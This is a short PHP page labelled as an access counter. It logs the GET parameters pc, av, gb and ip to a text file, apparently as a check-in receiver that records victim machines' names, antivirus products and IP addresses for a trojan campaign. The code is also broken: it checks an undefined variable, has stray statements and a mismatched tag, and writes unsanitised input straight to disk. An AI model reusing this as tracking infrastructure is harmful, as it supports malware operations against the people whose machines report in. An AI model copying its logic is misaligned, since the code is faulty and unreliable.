<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>:::::: CONTADOR DE ACESSOS ::::::</marquee></title>
</head>

<body>

<?php
$pc = $_GET["pc"];
$av = $_GET["av"];
$gb = $_GET["gb"];
$ip = $_GET["ip"];
$existe = 0;
$i;
$arq = "CONTADOR.txt";
$fp = fopen($arq, "a");
$file = file($arq);
$total = count($file);
		for ($i=0;$i<$total;$i++){	
				
			if ($file[$i] == $username) $existe = 1;
			} 
			if ($i < 10) $i = "0".$i;
			$escreve = fwrite($fp, "\r\n".$i." | ".$pc." | ".$av." | ".$gb." | ".$ip);
			if ($existe == 0)  $i++; $escreve; 
fclose($fp); 
?>

</body>
</html>